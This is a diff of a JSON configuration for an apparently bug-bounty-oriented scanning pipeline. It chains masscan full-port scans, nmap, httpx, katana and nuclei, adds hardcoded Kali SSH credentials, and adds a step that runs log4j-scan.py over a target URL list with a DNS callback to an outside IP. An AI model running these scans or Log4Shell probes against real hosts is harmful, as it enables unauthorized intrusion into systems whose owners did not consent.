@@ -1,6 +1,13 @@
 {
   "indexServer": "https://127.0.0.1:8081",
   "GKey": "5E45A2D0-1A88-4C6C-BB6C-815478CB472C",
+  "Proxy": ["proxyList"],
+  "debug": true,
+  "waitCmdSec": 30,
+  "kali_servers": [
+    {"name": "占位"},
+    {"name": "gs_kali","ip": "192.168.1.103","port": 22,"user": "kali","pswd": "kali","ik": "{HOME}/.ssh/id_rsa"}
+  ],
   "cmds": [
     {
       "x": 1,
@@ -9,10 +16,10 @@
       "self_do": ".subject_an,.subject_cn",
       "next_query_path": {
         "default":".domain,.subject_an,.subject_cn,.host",
-        "query_path": {"masscan": ".ip"}
+        "query_path": {"masscan": ".ip,.domain,.subject_an,.subject_cn,.host"}
       },
       "result_rm_key": "timestamp,fingerprint_hash,wildcard_certificate,tls_connection",
-      "next": ["httpx"]
+      "next": ["masscan"]
     },
     {
       "x": 1,
@@ -30,21 +37,28 @@
     {
       "x": 3,
       "name":"masscan",
-      "cmd": "masscan --rate=%d -oX - -p1-65535 ",
-      "next": ["nmap","httpx","tlsx"]
+      "cmd": "/usr/local/bin/masscan --rate=2000 -iL %s -oX %s -p 1-65535",
+      "next_query_path": {
+        "default":".target[]"
+      },
+      "next": ["nmap"]
     },
     {
       "x": 4,
+      "run_server": 1,
       "name": "nmap",
-      "cmd": "nmap -sV --version-all -Pn -oX - -p %s %s",
-      "next": ["gopoc"]
+      "cmd": "/usr/local/bin/nmap -sV --version-all -Pn -iL %s -oX %s -p %s",
+      "next_query_path": {
+        "default":".ips[].iport"
+      },
+      "next": []
     },
     {
       "x": 4,
       "name": "httpx",
       "result_rm_key": "timestamp,hash,time",
       "cmd": "httpx -title -websocket -method -server -location -ip  -pipeline -fr -csp-probe -http2 -p 443,80 -nc -silent -td -cname -t 64 -json",
-      "next": []
+      "next": ["katana","nuclei"]
     },
     {
       "x": 5,
@@ -57,6 +71,11 @@
       "name":"katana",
       "cmd": "katana -nc -silent -j -hl -system-chrome -headless-options '--blink-settings=\"imagesEnabled=false\",--enable-quic=\"imagesEnabled=false\"' -jc -kf all",
       "next": ["gopoc"]
+    },
+    {
+      "x":5,
+      "name": "log4j",
+      "cmd": "cat $HOME/MyWork/bug-bounty/data/zq/韩国/url_200.txt|xargs -I % python3 log4j-scan.py -u % --run-all-tests --custom-dns-callback-host 13.55.221.187:1098"
     }
   ]
 }
